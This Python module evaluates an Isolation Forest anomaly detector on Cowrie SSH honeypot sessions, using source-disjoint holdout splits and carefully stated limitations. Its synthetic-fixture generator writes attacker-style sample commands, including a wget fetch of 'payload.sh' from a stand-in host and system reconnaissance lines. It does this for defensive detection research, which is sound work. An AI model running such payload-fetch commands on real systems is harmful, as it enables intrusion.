"""Source-disjoint, explicitly labeled holdout evaluation for Cowrie sessions.

Validation is separate from the live model. Fit only on human-labeled
'background' training sessions, then score held-out labeled sessions.
No credentials, raw commands, source IPs, or session IDs enter output reports.

This is an *experimental* evaluation protocol, not a certified benchmark.
"""
from __future__ import annotations

import csv
from datetime import datetime, timezone
from hashlib import sha256
import json
import math
from pathlib import Path
import random
from typing import Any

import numpy as np
from sklearn.ensemble import IsolationForest
from sklearn.preprocessing import StandardScaler

from honeytrace.analyzer import FEATURES, analyze_events, load_events, parse_time

MIN_BASELINE = 25
MAX_LABEL_BYTES = 5 * 1024 * 1024
MAX_LABEL_ROWS = 20_000
VALID_LABELS = {"review", "background"}


def _features(row: dict) -> list[float]:
    return [math.log1p(max(0.0, float(row["features"].get(feature, 0)))) for feature in FEATURES]


def _read_labels(path: Path, sessions: list[dict]) -> dict[tuple[str, str], str]:
    """Read only reviewed CSV rows. Blank labels are intentionally ignored."""
    if path.stat().st_size > MAX_LABEL_BYTES:
        raise ValueError("Label CSV exceeds 5 MB")
    valid_ids = {(str(row["sensor"]), str(row["session"])) for row in sessions}
    labels: dict[tuple[str, str], str] = {}
    seen_ids: set[tuple[str, str]] = set()
    with path.open("r", newline="", encoding="utf-8-sig") as stream:
        reader = csv.DictReader(stream)
        if not reader.fieldnames or not {"sensor", "session", "label"}.issubset(reader.fieldnames):
            raise ValueError("Label CSV requires sensor,session,label columns")
        for line, row in enumerate(reader, 2):
            if line > MAX_LABEL_ROWS + 1:
                raise ValueError("Label CSV exceeds 20,000 data rows")
            key = ((row.get("sensor") or "").strip(), (row.get("session") or "").strip())
            if key not in valid_ids:
                raise ValueError(f"CSV line {line}: session not found in the matching Cowrie log")
            if key in seen_ids:
                raise ValueError(f"CSV line {line}: duplicate session row")
            seen_ids.add(key)
            label = (row.get("label") or "").strip().lower()
            if not label:
                continue
            if label not in VALID_LABELS:
                raise ValueError(f"CSV line {line}: label must be review or background")
            labels[key] = label
    return labels


def _selected(sessions: list[dict], labels: dict[tuple[str, str], str], label: str | None = None) -> list[dict]:
    return [row for row in sessions if (key := (row["sensor"], row["session"])) in labels and (label is None or labels[key] == label)]


def _ratio(a: int, b: int) -> float | None:
    return round(a / b, 4) if b else None


def _wilson(successes: int, trials: int) -> list[float] | None:
    """Approximate 95% Wilson interval for binomial rates."""
    if trials == 0:
        return None
    z = 1.959963984540054
    p = successes / trials
    denom = 1 + z * z / trials
    center = (p + z * z / (2 * trials)) / denom
    margin = z * math.sqrt((p * (1 - p) + z * z / (4 * trials)) / trials) / denom
    return [round(max(0, center - margin), 4), round(min(1, center + margin), 4)]


def _metrics(outcomes: list[tuple[bool, bool]]) -> dict[str, Any]:
    tp = sum(pred and actual for pred, actual in outcomes)
    fp = sum(pred and not actual for pred, actual in outcomes)
    tn = sum(not pred and not actual for pred, actual in outcomes)
    fn = sum(not pred and actual for pred, actual in outcomes)
    return {
        "evaluated": len(outcomes),
        "confusion": {"tp": tp, "fp": fp, "tn": tn, "fn": fn},
        "precision": _ratio(tp, tp + fp),
        "recall": _ratio(tp, tp + fn),
        "f1": _ratio(2 * tp, 2 * tp + fp + fn),
        "false_positive_rate": _ratio(fp, fp + tn),
        "precision_wilson_95": _wilson(tp, tp + fp),
        "recall_wilson_95": _wilson(tp, tp + fn),
        "fpr_wilson_95": _wilson(fp, fp + tn),
    }


def _timestamps(rows: list[dict]) -> list[datetime]:
    return [dt for row in rows if (dt := parse_time(row.get("start", ""))) is not None]


def _file_digest(path: Path) -> bytes:
    digest = sha256()
    with path.open("rb") as stream:
        for block in iter(lambda: stream.read(1024 * 1024), b""):
            digest.update(block)
    return digest.digest()


def validate_holdout(
    training_log: str | Path,
    training_labels: str | Path,
    testing_log: str | Path,
    testing_labels: str | Path,
    *, contamination: float = 0.08,
) -> dict[str, Any]:
    """Fit Isolation Forest on baseline-only training rows, evaluate on disjoint sources.

    The CSV must have sensor,session,label; review means analyst thinks the
    session warrants investigation, background means expected lab traffic.
    The test labels are *never used to fit or set thresholds*. Scaler and
    Isolation Forest are trained on the training subset exclusively.
    """
    if not 0.01 <= contamination <= 0.25 or not math.isfinite(contamination):
        raise ValueError("contamination must be a finite number between 0.01 and 0.25")
    train_path = Path(training_log)
    test_path = Path(testing_log)
    if _file_digest(train_path) == _file_digest(test_path):
        raise ValueError("Training and testing logs are identical; separate independent inputs")

    train_events, train_parse = load_events(train_path)
    test_events, test_parse = load_events(test_path)
    train_result = analyze_events(train_events, enable_ml=False)
    test_result = analyze_events(test_events, enable_ml=False)
    train_rows = train_result["sessions"]
    test_rows = test_result["sessions"]
    train_keys = {(r["sensor"], r["session"]) for r in train_rows}
    test_keys = {(r["sensor"], r["session"]) for r in test_rows}
    if train_keys & test_keys:
        raise ValueError("Overlapping sensor/session IDs across train and test inputs")
    train_labels_map = _read_labels(Path(training_labels), train_rows)
    test_labels_map = _read_labels(Path(testing_labels), test_rows)
    baseline = _selected(train_rows, train_labels_map, "background")
    held_out = _selected(test_rows, test_labels_map)
    if len(baseline) < MIN_BASELINE:
        raise ValueError(f"Need at least {MIN_BASELINE} manually labeled background training sessions; got {len(baseline)}")
    if not held_out:
        raise ValueError("No labeled testing sessions; review the test labels CSV")
    # Isolate *sources*, not merely session IDs. In local Docker, all test
    # sessions often have the same src_ip: that setup cannot prove generalization.
    train_sources = {row["src_ip"] for row in baseline}
    test_sources = {row["src_ip"] for row in held_out}
    if "" in train_sources or "" in test_sources:
        raise ValueError("Missing source IP in labeled sessions; source-disjoint evaluation unavailable")
    if train_sources & test_sources:
        raise ValueError("Training and testing share source IPs; use distinct sources for holdout validation (local Docker sessions typically share 172.17.0.1)")

    scaler = StandardScaler()
    x_train = scaler.fit_transform(np.asarray([_features(r) for r in baseline]))
    x_test = scaler.transform(np.asarray([_features(r) for r in held_out]))
    model = IsolationForest(n_estimators=150, contamination=contamination, random_state=42)
    model.fit(x_train)
    anomaly_flags = model.predict(x_test) == -1
    positives = [test_labels_map[(r["sensor"], r["session"])] == "review" for r in held_out]
    ml_result = _metrics([(bool(flag), target) for flag, target in zip(anomaly_flags, positives)])
    # Fixed rule-score threshold, using features and rules only. Unlike the
    # live analysis, this score contains no model-derived +15 adjustment.
    rules_result = _metrics([(r["risk"] >= 35, target) for r, target in zip(held_out, positives)])

    warnings: list[str] = []
    if len(held_out) < 30:
        warnings.append("Fewer than 30 held-out labeled sessions: metric uncertainty will be large")
    if not any(positives) or all(positives):
        warnings.append("Held-out data contain only one label class: some performance metrics are undefined")
    if len(train_sources) < 10 or len(test_sources) < 10:
        warnings.append("Few distinct source groups; generalization evidence is limited")
    train_times = _timestamps(baseline)
    test_times = _timestamps(held_out)
    time_separated = bool(train_times and test_times and max(train_times) < min(test_times))
    if not time_separated:
        warnings.append("The training period is not strictly earlier than the testing period (or timestamps are missing); this is source-disjoint, not time-forward validation")
    if train_parse["truncated"] or test_parse["truncated"]:
        warnings.append("At least one input hit the event processing limit; metrics may be incomplete")
    return {
        "version": "0.6.0",
        "evaluation_type": "source-disjoint, labeled holdout; training on background-only sessions",
        "labels": {"positive": "review (analyst investigation required)", "negative": "background (expected lab activity)"},
        "protocol": {
            "model": "IsolationForest + training-only StandardScaler",
            "fixed_training_contamination": contamination,
            "training_background_sessions": len(baseline),
            "excluded_training_review_sessions": sum(v == "review" for v in train_labels_map.values()),
            "testing_labeled_sessions": len(held_out),
            "testing_unlabeled_sessions": len(test_rows) - len(held_out),
            "training_source_groups": len(train_sources),
            "testing_source_groups": len(test_sources),
            "source_overlap": 0,
            "time_forward_split": time_separated,
            "training_only_fit": True,
            "independent_of_live_model": True,
        },
        "model": ml_result,
        "rules_threshold_35": rules_result,
        "warnings": warnings,
        "limitations": [
            "Analyst review/background labels are subjective; they are not verified malicious/benign ground truth.",
            "Anomaly scoring is unsupervised; an alert is not proof of an intrusion or attacker identity.",
            "The test labels did not affect model fitting or the anomaly threshold, but data collection and analyst selection can still cause bias.",
            "Wilson intervals reflect binomial sampling uncertainty, not dataset shift, correlated sessions, or annotation errors.",
            "Synthetic demo measurements do not establish accuracy on real traffic.",
        ],
    }


def create_validation_demo(base_dir: str | Path, *, seed: int = 127) -> dict[str, Path]:
    """Write synthetic, source-disjoint TRAIN/TEST fixtures and fake labels.

    This deliberately illustrates the evaluation pipeline, not real-world
    model performance. Refuses to replace existing files or manual labels.
    """
    base = Path(base_dir)
    base.mkdir(parents=True, exist_ok=True)
    paths = {
        "training_log": base / "train-cowrie.jsonl",
        "training_labels": base / "train-labels.csv",
        "testing_log": base / "test-cowrie.jsonl",
        "testing_labels": base / "test-labels.csv",
    }
    if any(p.exists() for p in paths.values()):
        raise FileExistsError("Demo files already exist. Choose an empty --dir; manual labels will never be overwritten")
    rng = random.Random(seed)
    datasets = [
        ("train", 65, "192.0.2", "2026-01-01T00:00:00+00:00"),
        ("test", 45, "198.51.100", "2026-02-01T00:00:00+00:00"),
    ]
    for split, total, prefix, start in datasets:
        start_time = datetime.fromisoformat(start)
        records = []
        label_rows = []
        for i in range(total):
            sid = f"{split}-{i:04d}"
            ip = f"{prefix}.{i + 1}"
            positive = split == "test" and i % 3 == 0
            label_rows.append({"sensor": "synthetic-validation", "session": sid, "label": "review" if positive else "background"})
            base_row = {"sensor": "synthetic-validation", "session": sid, "src_ip": ip, "protocol": "ssh"}
            from datetime import timedelta
            time = start_time + timedelta(minutes=i * 8)
            def record(event_id: str, **extra: Any) -> None:
                nonlocal time
                records.append({**base_row, "eventid": event_id, "timestamp": time.isoformat().replace("+00:00", "Z"), **extra})
                time += timedelta(seconds=rng.randint(1, 4))
            record("cowrie.session.connect")
            failures = rng.randint(0, 2) if not positive else rng.randint(7, 14)
            for _ in range(failures):
                record("cowrie.login.failed", username="root", password="SYNTHETIC_NOT_REAL")
            if i % 4 != 0 or positive:
                record("cowrie.login.success", username="root", password="SYNTHETIC_NOT_REAL")
                commands = (rng.choice([["whoami", "pwd"], ["ls", "hostname"], ["id"]])
                            if not positive else rng.choice([
                                ["whoami", "wget https://example.invalid/payload.sh"],
                                ["uname -a", "crontab -l", "cat /etc/os-release"],
                                ["id", "base64 -d fixture.txt"],
                            ]))
                for command in commands:
                    record("cowrie.command.input", input=command)
            record("cowrie.session.closed")
        log_path = paths[f"{split}ing_log"] if split == "train" else paths["testing_log"]
        labels_path = paths[f"{split}ing_labels"] if split == "train" else paths["testing_labels"]
        # Files were pre-checked; exclusive creation avoids clobbering labels.
        with log_path.open("x", encoding="utf-8") as out:
            out.write("".join(json.dumps(r, ensure_ascii=True) + "\n" for r in records))
        with labels_path.open("x", newline="", encoding="utf-8") as out:
            writer = csv.DictWriter(out, fieldnames=["sensor", "session", "label"])
            writer.writeheader()
            writer.writerows(label_rows)
    return paths
